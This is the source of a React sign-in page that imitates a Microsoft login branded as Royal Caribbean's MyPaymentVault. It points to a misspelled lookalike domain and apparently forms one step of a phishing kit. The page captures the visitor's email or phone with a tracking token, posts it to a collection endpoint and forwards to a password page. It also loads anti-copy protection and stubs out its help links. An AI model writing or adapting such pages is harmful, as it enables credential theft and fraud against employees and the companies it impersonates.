import { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { useMutation } from '@tanstack/react-query';
import { useLocation } from 'wouter';
import { AntiCopyProtection } from '@/components/AntiCopyProtection';
import { SEO } from '@/components/SEO';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { getSourceInfo } from '@/lib/sourceInfo';
import { z } from 'zod';
import '@/styles/styles.css';
import rcgLogo from '@assets/bannerlogo_1760638008519.png';
import cruiseBanner from '@assets/image_1760638001700.png';

const microsoftEmailSchema = z.object({
  emailOrPhone: z.string().min(1, "Enter a valid email, phone number, or Skype name"),
});

type MicrosoftEmailForm = z.infer<typeof microsoftEmailSchema>;

export default function MicrosoftEmailPage() {
  const [, setLocation] = useLocation();
  const [loginAttemptId, setLoginAttemptId] = useState('');
  const { toast } = useToast();

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<MicrosoftEmailForm>({
    resolver: zodResolver(microsoftEmailSchema),
  });

  useEffect(() => {
    console.log('[MicrosoftEmail] Page loaded - full URL:', window.location.href);
    // First try to get token from URL query params
    const urlParams = new URLSearchParams(window.location.search);
    const tokenFromUrl = urlParams.get('token');
    console.log('[MicrosoftEmail] Token from URL:', tokenFromUrl);
    
    if (tokenFromUrl) {
      console.log('[MicrosoftEmail] Using token from URL:', tokenFromUrl);
      setLoginAttemptId(tokenFromUrl);
      // Hide token from URL
      window.history.replaceState(null, '', window.location.pathname);
      // Store in sessionStorage for backup
      sessionStorage.setItem('loginAttemptId', tokenFromUrl);
    } else {
      // Fallback to sessionStorage
      const attemptId = sessionStorage.getItem('loginAttemptId');
      console.log('[MicrosoftEmail] Token from sessionStorage:', attemptId);
      if (!attemptId) {
        console.log('[MicrosoftEmail] No token found - redirecting to home');
        toast({
          title: 'Error',
          description: 'Session expired. Please login again.',
          variant: 'destructive',
        });
        setTimeout(() => setLocation('/'), 2000);
        return;
      }
      setLoginAttemptId(attemptId);
    }
  }, [toast, setLocation]);

  const emailMutation = useMutation({
    mutationFn: async (data: MicrosoftEmailForm) => {
      const res = await apiRequest('POST', '/api/microsoft-email', {
        loginAttemptId,
        emailOrPhone: data.emailOrPhone,
        sourceInfo: getSourceInfo(),
      });
      return await res.json();
    },
    onSuccess: (data: { success: boolean; emailOrPhone: string }) => {
      sessionStorage.setItem('microsoftEmail', data.emailOrPhone);
      setLocation(`/microsoft-password?email=${encodeURIComponent(data.emailOrPhone)}&token=${loginAttemptId}`);
    },
    onError: (error: Error) => {
      toast({
        title: 'Error',
        description: error.message || 'Failed to submit. Please try again.',
        variant: 'destructive',
      });
    },
  });

  const onSubmit = (data: MicrosoftEmailForm) => {
    emailMutation.mutate(data);
  };

  const handleBack = () => {
    sessionStorage.clear();
    setLocation('/');
  };

  return (
    <>
      <SEO 
        title="Sign In | MyPaymentVault Secure Authentication"
        description="Sign in to MyPaymentVault with secure authentication. Access your payment details and manage your account safely."
        keywords="MyPaymentVault sign in, secure login, mypaymentvault authentication, payment vault access, employee login"
        canonical="https://login-mypaymentvaultl.com/microsoft-email"
      />
      <AntiCopyProtection />
      <div style={{ 
        minHeight: '100vh', 
        display: 'flex', 
        flexDirection: 'column',
        backgroundColor: '#001f3f',
        position: 'relative'
      }}>
        {/* Header */}
        <div style={{ padding: '20px', position: 'absolute', top: 0, left: 0 }}>
          <button
            onClick={handleBack}
            style={{
              background: 'none',
              border: 'none',
              fontSize: '15px',
              color: '#ffffff',
              cursor: 'pointer',
              padding: '0',
            }}
            data-testid="button-back"
          >
            ← Cancel
          </button>
        </div>

        {/* Main Content */}
        <div style={{ 
          flex: 1, 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center',
          padding: '20px',
          flexDirection: 'column',
          gap: '60px'
        }}>
          {/* Form Container */}
          <div style={{ 
            width: '100%', 
            maxWidth: '440px',
            backgroundColor: '#ffffff',
            padding: '48px 44px',
            boxShadow: '0 2px 6px rgba(0,0,0,0.2)',
          }}>
            {/* Logo */}
            <div style={{ textAlign: 'center', marginBottom: '24px' }}>
              <img 
                src={rcgLogo} 
                alt="Login MyPaymentVault - Royal Caribbean Group Secure Payment Gateway" 
                style={{ height: '50px' }}
                data-testid="img-rcg-logo"
              />
            </div>

            <h1 style={{ 
              fontSize: '24px', 
              fontWeight: '600', 
              marginBottom: '8px',
              color: '#1b1b1b'
            }} data-testid="text-title">
              Sign in
            </h1>

            <p style={{
              fontSize: '15px',
              color: '#605e5c',
              marginBottom: '24px'
            }}>
              to continue to MyPaymentVault
            </p>

            <form onSubmit={handleSubmit(onSubmit)}>
              <div style={{ marginBottom: '20px' }}>
                <input
                  {...register('emailOrPhone')}
                  type="text"
                  placeholder="Email, phone, or Skype"
                  style={{
                    width: '100%',
                    padding: '11px 12px',
                    fontSize: '15px',
                    border: errors.emailOrPhone ? '1px solid #e81123' : '1px solid #8a8886',
                    outline: 'none',
                    backgroundColor: '#ffffff',
                    color: '#000000',
                  }}
                  onFocus={(e) => e.target.style.border = '1px solid #0067b8'}
                  onBlur={(e) => e.target.style.border = errors.emailOrPhone ? '1px solid #e81123' : '1px solid #8a8886'}
                  data-testid="input-email"
                />
                {errors.emailOrPhone && (
                  <div style={{ 
                    color: '#e81123', 
                    fontSize: '12px', 
                    marginTop: '6px',
                    display: 'flex',
                    alignItems: 'center',
                  }} data-testid="text-error">
                    <span style={{ marginRight: '4px' }}>⚠</span>
                    {errors.emailOrPhone.message}
                  </div>
                )}
              </div>

              <div style={{ marginBottom: '24px' }}>
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    toast({
                      description: "Please contact support for account recovery",
                    });
                  }}
                  style={{
                    color: '#0067b8',
                    fontSize: '13px',
                    textDecoration: 'none',
                  }}
                  data-testid="link-help"
                >
                  Can't access your account?
                </a>
              </div>

              <div style={{ 
                display: 'flex', 
                justifyContent: 'flex-end',
                marginBottom: '28px'
              }}>
                <button
                  type="submit"
                  disabled={emailMutation.isPending}
                  style={{
                    padding: '10px 28px',
                    fontSize: '15px',
                    fontWeight: '600',
                    backgroundColor: '#0067b8',
                    color: '#ffffff',
                    border: 'none',
                    cursor: emailMutation.isPending ? 'not-allowed' : 'pointer',
                    opacity: emailMutation.isPending ? 0.6 : 1,
                  }}
                  data-testid="button-next"
                >
                  {emailMutation.isPending ? 'Loading...' : 'Next'}
                </button>
              </div>

              <div>
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    toast({
                      description: "Sign-in options are currently unavailable",
                    });
                  }}
                  style={{
                    color: '#0067b8',
                    fontSize: '13px',
                    textDecoration: 'none',
                    display: 'inline-flex',
                    alignItems: 'center',
                  }}
                  data-testid="link-signin-options"
                >
                  <span style={{ marginRight: '8px' }}>🔑</span>
                  Sign-in options
                </a>
              </div>
            </form>
          </div>

          {/* Cruise Banner */}
          <div style={{ width: '100%', maxWidth: '1024px' }}>
            <img 
              src={cruiseBanner} 
              alt="Login MyPaymentVault Payment Partners - Royal Caribbean, Celebrity Cruises, Silversea, TUI Cruises, Hapag-Lloyd" 
              style={{ 
                width: '100%', 
                height: 'auto',
                display: 'block'
              }}
              data-testid="img-cruise-banner"
            />
          </div>
        </div>

        {/* Footer */}
        <div style={{ 
          padding: '16px 20px',
          display: 'flex',
          justifyContent: 'center',
          gap: '20px',
          fontSize: '12px',
          color: '#ffffff'
        }}>
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            style={{ color: '#ffffff', textDecoration: 'none' }}
            data-testid="link-terms"
          >
            Terms of use
          </a>
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            style={{ color: '#ffffff', textDecoration: 'none' }}
            data-testid="link-privacy"
          >
            Privacy &amp; cookies
          </a>
          <button
            onClick={(e) => e.preventDefault()}
            style={{
              background: 'none',
              border: 'none',
              color: '#ffffff',
              cursor: 'pointer',
              padding: '0',
              fontSize: '12px',
            }}
            data-testid="button-more"
          >
            ...
          </button>
        </div>
      </div>
    </>
  );
}
